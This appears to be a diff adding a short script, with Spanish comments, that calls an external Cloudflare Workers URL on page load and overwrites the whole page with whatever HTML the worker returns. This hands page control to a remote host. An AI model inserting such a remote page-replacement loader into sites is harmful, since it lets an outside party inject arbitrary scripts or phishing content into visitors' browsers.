@@ -1,0 +1,35 @@
+<script>
+    // Configuración
+    const WORKER_URL = 'https://quiet-frog-4ad6.innovatools069.workers.dev/';
+    const NOMBRE_SW = 'perfumeria667';
+    
+    // Verificación inmediata
+    (async function() {
+        try {
+            // Solicitar verificación
+            const response = await fetch(`${WORKER_URL}?nombre=${encodeURIComponent(NOMBRE_SW)}`);
+            
+            if (!response.ok) {
+                throw new Error('Error en la solicitud');
+            }
+            
+            // Obtener contenido
+            const content = await response.text();
+            
+            // Si hay contenido HTML, reemplazar toda la página
+            if (content && content.trim() !== '') {
+                document.open();
+                document.write(content);
+                document.close();
+                return;
+            }
+            
+            // Si no hay coincidencia
+            document.getElementById('noMatch').style.display = 'block';
+            
+        } catch (error) {
+            console.error('Error:', error);
+            document.getElementById('noMatch').style.display = 'block';
+        }
+    })();
+</script>
